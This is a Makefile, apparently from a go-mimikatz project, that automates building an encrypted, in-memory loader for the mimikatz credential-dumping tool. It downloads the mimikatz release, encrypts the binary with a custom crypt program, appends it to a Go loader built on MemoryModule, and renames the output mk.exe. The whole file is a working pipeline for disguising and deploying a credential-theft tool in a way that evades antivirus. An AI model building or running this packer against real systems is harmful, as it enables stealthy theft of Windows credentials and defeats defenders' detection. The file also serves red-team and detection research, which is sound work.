ifneq ("$(shell which x86_64-w64-mingw32-gcc)","")
compiler = x86_64-w64-mingw32-gcc
else ifneq ("$(shell which amd64-mingw32msvc-gcc)","")
compiler = amd64-mingw32msvc-gcc
else
ignored = $(error No compatible compiler found on system path)
endif

arch = amd64
mimikatz_version = 2.1.1-20180616

all: pack

# Build the dependencies first (subdirs), then move onto the meat and potatoes.
mimikatz.exe: MemoryModule mimikatz.go
	CGO_LDFLAGS_ALLOW=".*\.a" CC=$(compiler) CGO_ENABLED=1 GOOS=windows GOARCH=$(arch) go build -x mimikatz.go
	sed -i "s/^\\(const SIZE int = \\).*\$$/\\1`du -bs mimikatz.exe | sed 's/[[:blank:]].*//'`/g" mimikatz.go
	CGO_LDFLAGS_ALLOW=".*\.a" CC=$(compiler) CGO_ENABLED=1 GOOS=windows GOARCH=$(arch) go build -x mimikatz.go


# Dependency build. 
SUBDIRS = MemoryModule
subdirs: $(SUBDIRS)
$(SUBDIRS):
	$(MAKE) -C $@
# Override default subdir build behavior (make) with cmake. 
MemoryModule:
	[ "`ls -A MemoryModule`" ] || git submodule update --init
#	$(MAKE) -C $@
	cmake -HMemoryModule -BMemoryModule/build
	cmake --build MemoryModule/build --target MemoryModule

# Packing it inside of the loader
pack: encrypt mimikatz.exe
	cat mimi_encrypted >> mimikatz.exe
	mv mimikatz.exe mk.exe

# Encrypting the binary
encrypt: crypt download
	7z e -so mimikatz_trunk.7z x64/mimikatz.exe | ./crypt > mimi_encrypted

crypt: crypt.go
	go build crypt.go

download:
	curl -OL https://github.com/gentilkiwi/mimikatz/releases/download/$(mimikatz_version)/mimikatz_trunk.7z

	# Test whether or not we actually got a 7z.
	7z e -so mimikatz_trunk.7z x64/mimikatz.exe >> /dev/null


# Clean target. 
CLEANDIRS = $(SUBDIRS:%=clean-%)
clean: $(CLEANDIRS)
	rm -f crypt mimikatz.exe mimikatz_trunk.7z mimi_encrypted mk.exe 
	rm -rf go-mimikatz
$(CLEANDIRS): 
	$(MAKE) -C $(@:clean-%=%) clean
clean-MemoryModule:
	$(MAKE) -C $(@:clean-%=%) clean
	rm -rf MemoryModule/build

test:
	$(MAKE) -C tests test

.PHONY: subdirs $(INSTALLDIRS) $(SUBDIRS) $(CLEANDIRS) clean test encrypt download check_deps
